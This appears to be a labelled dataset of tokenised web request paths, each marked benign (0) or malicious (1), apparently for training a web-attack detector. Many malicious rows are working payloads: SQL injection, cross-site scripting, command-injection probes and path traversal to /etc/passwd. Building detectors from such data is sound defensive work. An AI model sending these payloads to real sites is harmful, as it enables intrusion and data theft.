request	label
/ javascript / marketing . rar 	0
/ bbc radio 5 / 	0
/ getlisted / 	0
"/  ?  < script > document . cookie =  "" testqppc = 8767 ;  ""  <  / script > "	1
/ javascript / json . exe 	1
/ string / strings / parameters = aitor 	0
/ y8pmygrp . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo jwnhuw )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ javascript / cgi-bin2 . bat 	0
/ 170544 / 	0
/ javascript / 1001 . asp 	0
/ 188013 / 	0
/ intadressen / 	0
/ string / strings / parameters = 7198 	0
"/ w4996nr0 . kspx ?  < meta http-equiv = set-cookie content =  "" testttvs = 7163 ""  > "	1
/ string / strings / parameters = < object classid = clsid : ae24fdae-03c6-11d1-8b76-0080c744f389 >  < param name = url value = javascript : confirm ( document . location )  >  <  / object > 	1
/ string / id = 1 & nombre =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & precio = 85 & cantidad = 78 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = 1 '  )  )  and  ( 7517 = 3423 )  * 3423 and  (  (  ' aenz '  =  ' aenz 	1
"/ string / strings / parameters = < layer + src =  "" http :  /  / localhost ""  > "	1
/ en-us / account / detail . asp ? nchannel =  ' 1 	1
/ javascript / owa . exe 	1
/ 6977-biblepro / 	0
/ brnchrom / 	0
/ examples / jsp / error / direct . php ? rf =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 '  where 7910 = 7910 ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 -- 	1
/ string / strings / parameters = escrutador 	0
/ dkblucorner / 	0
/ string / strings / parameters = 1 '  )  )  )  union all select null , null , null , null , null , null # 	1
/ htbin / pfdispaly . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  ' 	1
/ string / strings / parameters = arbuckle 	0
/ recycling4 / 	0
/ javascript / mssql . as 	0
/ string / strings / parameters = sparky 	0
/ n1afe1y6 . dll ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / id = 2 & nombre = queso + manchego & precio = 85 & cantidad = 28 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = print (  ` echo etzhwz \ necho  $  (  ( 20 + 88 )  )  \ necho etzhwz \ necho etzhwz `  )  ;  /  / etzhwz 	1
/ string / modo = registro & login = koolwine & password = seni + l & nombre = basilisa & apellidos = pimienta + rosas & email = bjerg @ hangartalleres . er & dni = 78581094f & direccion = calle + profeta ,  + 96 ,  + 2 ? c & ciudad = pineda + trasmonte & cp = 29127 & provincia = teruel & ntc = 8866944660576355 & b1 = registrar 	0
/ forumnews-page16 / 	0
/ plundered / 	0
"/ string / strings / parameters = ;  str =  $  ( echo rppevg )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ string / strings / parameters = & echo $ ifsninvio $  (  ( 20 + 74 )  )  $  ( echo $ ifsninvio ) ninvio \ 	1
/ string / strings / parameters = nelber 	0
/ string / strings / parameters = angilberto 	0
/ cacti / tinybrowser / upload . php ? badfiles = 1 >  < script > alert (  ' tinybrowser_multiple_xss . nasl '  )  <  / script > 	1
/ string / id = bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & nombre = jamn + ibrico & precio = 85 & cantidad = 80 & b1 = aadir + al + carrito 	1
/ declan / 	0
/ string / strings / parameters = rainelda 	0
/ picks_software / 	0
/ fcgi-bin / echo ? foo =  < script > alert (  ' vulnerable '  )  <  / script > 	1
/ string / str =  $  ( echo zdskke )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ examples / servlets / servlet / jgs_portal_statistik . php ? meinaction = themen & month = 1 & year = 1 ' 	1
/ 1004359082 / 	0
/ examples / jsp / cal / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script > 	1
/ n-subscribe / 	0
/ mazda-tm / 	0
"/ main . php ? stuff =  ""  & rm \ xa0q39243847 & rem \ xa0 "	1
"/ string / strings / parameters = < a href =  ""  \ x10javascript : javascript : alert ( 1 )  ""  id =  "" fuzzelement1 ""  > test <  / a > "	1
/ string / strings / parameters = x�? <  / title >  < img src = x onerror = confirm ( 1 )  > 	1
/ string / strings / parameters = 1 )  as fxfe where 1148 = 1148 or  ( select  *  from  ( select ( sleep ( 5 )  )  ) sddo )  # 	1
/ pid5184700 / 	0
/ q93531168 	0
/ string / strings / parameters = '  |  | echo qzicoq $  (  ( 45 + 93 )  )  $  ( echo qzicoq ) qzicoq /  / 	1
/ ourvision / 	0
/ string / strings / parameters = tinti @ 21horas . hr 	0
"/ string / strings / parameters = < iframe src =  /  onload = eval ( unescape ( this . name . replace (  /  \  / g , null )  )  )  name = fff = new this . contentwindow . window . xmlhttprequest (  )  ; fff . open (  "" get ""  ,  "" xssme2 ""  )  ; fff . onreadystatechange = function (  )  { if  ( fff . readystate =  = 4  &  &  fff . status =  = 200 )  { alert ( fff . responsetext )  ;  }  }  ; fff . send (  )  ;  >  <  / iframe > "	1
/ examples / jsp / cal / index . php ? site =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ main . php ? stuff =  "" rm \ x0bq27764952 & rem \ x0b "	1
/ string / strings / parameters = 7208264078394889 	0
/ imag006 / 	0
/ string / strings / parameters = ;  str =  $  ( echo uomphd )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ string / strings / parameters = meinrad 	0
/ beatpirate / 	0
/ string / modo = entrar & login = haze * l & pwd = pluvimetro & remember = off & b1 = entrar 	1
/ string / strings / parameters = 1 '  )  )  ; if ( 6554 = 1534 )  select 6554 else drop function buqb -- 	1
/ javascript / entry . html 	0
/ string / modo = registro & login = gretal3 & password = carbunclo & nombre = cruz & apellidos = chilel & email = braschi_courtneidge @ djbroadcast . an & dni = 00660335m & direccion = carretera + industrial + 149 ,  +  & ciudad = sojuela & cp = 04869 & provincia = navarra & ntc = 4431931876895268 & b1 = registrar 	0
"/ string / strings / parameters = -9140 ""  ""  )  )  union all select 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 # "	1
/ string / strings / parameters = 1 %  '  )  )  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  (  (  '  %  '  =  ' 	1
"/ main . php ? logout =  "" ver \ x0b > q12574322 & rem \ x0b "	1
/ string / strings / parameters = cabanyes ,  les 	0
/ examples / jsp / colors / index . php ? op = default & date = 200607 '  union select 1 , 1739511784 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ in your honor / 	0
/ string / strings / parameters = noem 	0
/ javascript / javax . php 	0
/ javascript / theme . aspx 	0
/ 1165317494-4 / 	0
/ phpmyadmin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 999630768 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ javascript /  . passwd . csproj 	1
/ string / strings / parameters = lischyns 	0
/ splinter cell chaos theory demo / 	0
/ u4056622 / 	0
/ hotbutton_join / 	0
/ string / strings / parameters = despestaar 	0
/ string / strings / parameters = santa leonor ,  187 ,  7 ? h 	0
/ nav07_off / 	0
/ string / strings / parameters = selbrede 	0
"/ string / strings / parameters = < img src =  ""  "" jav ascript : document . cookie = true ;  ""  ""  > "	1
/ string / modo = registro & login = dickens & password = l '  , 4uenga & nombre = bertilda & apellidos = scampini + benito & email = bevens @ elbauldelosrefranes . gov & dni = 25301830j & direccion = avinguda + joan + march ,  + 14 ,  +  & ciudad = gjar & cp = 11630 & provincia = las + palmas & ntc = 4290013346826591 & b1 = registrar 	1
/ string / strings / parameters = 2812685253359971 	0
/  \  \  \  .  .  \  .  .  \  .  .  \  .  .  \  { file } 	1
/ string / strings / parameters = 1 '  )  )  or char ( 68 )  |  | char ( 69 )  |  | char ( 97 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 )  , 0 )  , 5000000000 )  , null )  and  (  (  ' xuwl '  like  ' xuwl 	1
/ string / strings / parameters = -6405 '  union all select 8235 , 8235 , 8235 , 8235 , 8235 # 	1
/ string / strings / parameters = whitehead . kogan @ lamarsrl . qa 	0
"/ jackrabbit / search . jsp ? q =  %  ""  < script > alert ( 1332010391 )  <  / script > "	1
/ divider_short / 	0
"/ string / strings / parameters = ""  |   [  2 -ne  $  ( echo xhmatl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ string / strings / parameters = 1 '  ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 and  ' bnfu '  like  ' bnfu 	1
/ string / strings / parameters = 1 '  )  )  as oocd where 2919 = 2919 or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
"/ help . php ? q =  ""  \ x0ddel \ x09q93881688 \ x09 # "	1
